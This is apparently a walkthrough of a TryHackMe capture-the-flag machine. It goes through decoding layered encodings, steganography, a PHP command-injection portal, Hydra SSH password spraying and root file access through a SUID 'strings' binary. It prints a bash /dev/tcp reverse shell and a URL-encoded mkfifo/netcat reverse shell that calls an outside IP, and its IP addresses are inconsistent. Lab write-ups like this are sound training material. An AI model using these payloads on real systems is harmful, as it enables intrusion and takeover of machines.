# TryHackMe - Jack-of-all-trades

**Machine Name:** Jack-of-all-trades  
**Difficulty:** Easy/Medium  
**Category:** Steganography / Encoding / RCE / SUID Exploitation  
**IP Address:** 10.81.180.163  

## Description
This challenge involves a multi-layered hunt through non-standard port configurations, complex encoding "onions," and steganographic decoys. The objective is to exploit a command injection vulnerability within a hidden PHP recovery portal, escalate privileges to a local user via credential spraying, and finally abuse an incorrectly configured SUID binary to achieve root-level file access.

---

## Enumeration

### Port Scanning
I started with an nmap scan to enumerate open services:
`nmap -p- -sV -sC -Pn --min-rate 1000 10.81.180.163`

**Findings:**
* **Port 22 (HTTP):** Open. Running Apache/2.4.10. (Non-standard port for Web).
* **Port 80 (SSH):** Open. Running OpenSSH 6.7p1. (Non-standard port for SSH).

### Web Discovery
I had to browse trough **Curl** since Firefox wasnt allowing me to browse, it replyed with: "This address is restricted. This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection." So i just used **Curl**.
</br>Either way, browsing to `curl -s http://10.81.173.217:22` revealed a personal site for "Jack." Inspecting the page source code uncovered 3 critical clues:
1.  **3 Images:** header.jpg, stego.jpg and jackinthebox.jpg
2.  **Hidden Page:** A comment pointing to /recovery.php.
3.  **Encoded Note:** A Base64 string: UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==

```
<html>
        <head>
                <title>Jack-of-all-trades!</title>
                <link href="assets/style.css" rel=stylesheet type=text/css>
        </head>
        <body>
                <img id="header" src="assets/header.jpg" width=100%>
                <h1>Welcome to Jack-of-all-trades!</h1>
                <main>
                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
                        <img src="assets/stego.jpg">
                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
                        <img src="assets/jackinthebox.jpg">
                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
                        <p id="signature">Jack</p>
                </main>
        </body>
</html>
```

**Decoding the Base64 string:**
`echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d`
> Output: "Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq"

---

## The Encoding Onion
On the /recovery.php page `curl -s http://10.81.173.217:22/recovery.php`, another large encoded string was found in the HTML comments. Following the hint regarding "Johny Graves" and his "amazing encoding systems", i found this myspace page: https://myspace.com/johny.graves with the content: "My Favourite Crypto Method: First encode your message with a ROT13 cipher. Next Convert it to Hex. Finally convert the result into Base32.It's uncrackable!".</br> So I went to Cyberchef and decoded the string following the given tip.

1.  **Base32:** Decoding the block revealed a Hexadecimal string.
2.  **Hexadecimal:** Converting the Hex string to ASCII revealed a ROT13 string.
3.  **ROT13:** Applying a 13-character shift to the string revealed the final hint:
    > "Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S"

```
<!DOCTYPE html>
<html>
        <head>
                <title>Recovery Page</title>
                <style>
                        body{
                                text-align: center;
                        }
                </style>
        </head>
        <body>
                <h1>Hello Jack! Did you forget your machine password again?..</h1>
                <form action="/recovery.php" method="POST">
                        <label>Username:</label><br>
                        <input name="user" type="text"><br>
                        <label>Password:</label><br>
                        <input name="pass" type="password"><br>
                        <input type="submit" value="Submit">
                </form>
                <!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
                 
        </body>
</html>

```

---

## Steganography (Creds Extraction)
I followed the Bitly link and it led to the wikipedia page of Stegosauria, referencing the initial image on the front page of a stegossaur, so i downloaded it using:`curl -s http://10.81.173.217:22/assets/stego.jpg -o stego.jpg`, I then using the password we already found "u?WtKSraq", analyzed the homepage assets:

```
steghide --extract -sf stego.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
```
But in the newly created file it said:

"Hehe. Gotcha!

You're on the right path, but wrong image!"

So i tried with the image jackinthebox.jpg, but it didnt work either, so finally i tried with the header image:

```
curl -s http://10.81.173.217:22/assets/header.jpg -o header.jpg
steghide extract -sf header.jpg
Enter passphrase: 
wrote extracted data to "cms.creds"
``` 

**Extracted cms.creds:**
* **Username:** jackinthebox
* **Password:** TplFxiSHjY

---

## Exploitation: Remote Code Execution (RCE)

### Accessing the Secret Portal
I submitted the credentials to /recovery.php via a POST request. The server set a login cookie and redirected to a secret management directory:
`curl -i -X POST "http://10.81.180.163:22/recovery.php" -d "user=jackinthebox&pass=TplFxiSHjY"`
* **Redirects to:** /nnxhweOV/index.php but without the right cookie it redirects me to the main page, so i got:

```
HTTP/1.1 302 Found
Date: Sun, 01 Mar 2026 02:07:27 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=afi6peev3l3d8qfo6tlltcd8s1; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84; expires=Tue, 03-Mar-2026 02:07:27 GMT; Max-Age=172800
location: /nnxhweOV/index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8

HTTP/1.1 302 Found
Date: Sun, 01 Mar 2026 02:07:27 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=ldcqgvslkcdmflgo18rf5t36e4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
location: ../index.html
Content-Length: 0
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sun, 01 Mar 2026 02:07:27 GMT
Server: Apache/2.4.10 (Debian)
Last-Modified: Sat, 29 Feb 2020 20:25:18 GMT
ETag: "645-59fbcc0a10780"
Accept-Ranges: bytes
Content-Length: 1605
Vary: Accept-Encoding
Content-Type: text/html

<html>
        <head>
                <title>Jack-of-all-trades!</title>
                <link href="assets/style.css" rel=stylesheet type=text/css>
        </head>
        <body>
                <img id="header" src="assets/header.jpg" width=100%>
                <h1>Welcome to Jack-of-all-trades!</h1>
                <main>
                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
                        <img src="assets/stego.jpg">
                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
                        <img src="assets/jackinthebox.jpg">
                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
                        <p id="signature">Jack</p>
                </main>
        </body>
</html>

```

So then I added the login cookie i found, and did `curl -s -b "login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84" http://10.81.180.163:22/nnxhweOV/index.php`

and it returned:

"GET me a 'cmd' and I'll run it for you Future-Jack."

### Command Injection
Following the clue above I tried to add the 'cmd' GET parameter, and confirmed RCE by identifying the current user:

`curl -s -b "login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84" "http://10.81.180.163:22/nnxhweOV/index.php?cmd=whoami"`
* **Output:** www-data

### Establishing a Reverse Shell

We don't want to keep typing curl for every command so we'll get a real shell. Since we know we can run bash commands, we'll use the same trick as before.

We set up a listener on anoter terminal:

`nc -lnvp 4444`

and then We'll create a Payload to connect to our listener, We'll send a URL encoded bash command to bypass any weird character issues:

```
#Replace YOUR_IP with your tun0 IP

PAYLOAD=$(echo -n "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" | base64)
curl -s -b "login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84" "http://10.81.180.163:22/nnxhweOV/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.214.156%204444%20%3E%2Ftmp%2Ff"
```

This is a famous Netcat Reverse Shell i found.

What each part does:

* rm /tmp/f;mkfifo /tmp/f: Creates a "named pipe" (a temporary file that acts as a bridge for data).

* cat /tmp/f|/bin/sh -i 2>&1: Takes what comes into the pipe, sends it to the command shell (sh), and sends any errors back to the same place.

* nc 192.168.214.156 4444 >/tmp/f: This connects back to your IP address on port 4444. Anything you type in your terminal is sent through the pipe into the target's shell.

All of the above are obviously URL Encoded.

With this we get a connection on our listener. 

---

## Privilege Escalation

### Lateral Movement (User: jack)
Inside the /home directory, I discovered "jacks_password_list".

```
$ ls /home
jack
jacks_password_list

$ cat /home/jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```
Now out of the victims machine(we wont need it anymore), I copied the password list into a file and used Hydra to perform credential spraying on the SSH service (Port 80):
`hydra -l jack -P jackspasswords ssh://10.81.180.163:80`

```
$ hydra -l jack -P jackspasswords.txt ssh://10.81.180.163:80

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-01 02:26:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.81.180.163:80/
[80][ssh] host: 10.81.180.163   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-01 02:26:40
```

* **Valid Password:** ITMJpGGIqg1jn?>@

So now we use Jacks login to login into his SSH:

```
$ ssh jack@10.81.180.163 -p 80

The authenticity of host '[10.81.180.163]:80 ([10.81.180.163]:80)' can't be established.
ED25519 key fingerprint is: SHA256:bSyXlK+OxeoJlGqap08C5QAC61h1fMG68V+HNoDA9lk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.81.180.163]:80' (ED25519) to the list of known hosts.
jack@10.81.180.163's password: 
jack@jack-of-all-trades:~$
```

By doing 'ls' inside we can find an image called user.jpg and we download it.

```                                                                                                          
┌──(morth㉿kali)-[~]
└─$ scp -P 80 jack@10.81.180.163:~/user.jpg ./user_flag.jpg
jack@10.81.180.163's password: 
user.jpg        
```

The User flag is writen on the image.

* **User Flag (Inside user.jpg):** (User Flag)....._{........}

### Root Flag Retrieval
I searched for SUID binaries to find a path to root:
`find / -perm -u=s -type f 2>/dev/null`

The utility /usr/bin/strings was found to have the SUID bit set. I used it to read the protected **root flag**:
`strings /root/root.txt`

```
jack@jack-of-all-trades:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su

jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: (Root Flag)........_{......}
```

**Final Findings:**
The root file revealed a "To-Do" list including the final flag and references to recreational activities involving his friend "Bill."

---

## Conclusion
This machine highlights the importance of service obfuscation awareness and the dangers of SUID misconfigurations. By correctly identifying non-standard ports, peeling back multiple layers of encoding, and identifying steganographic payloads, I was able to transition from an unauthenticated web user to full root-level file access.
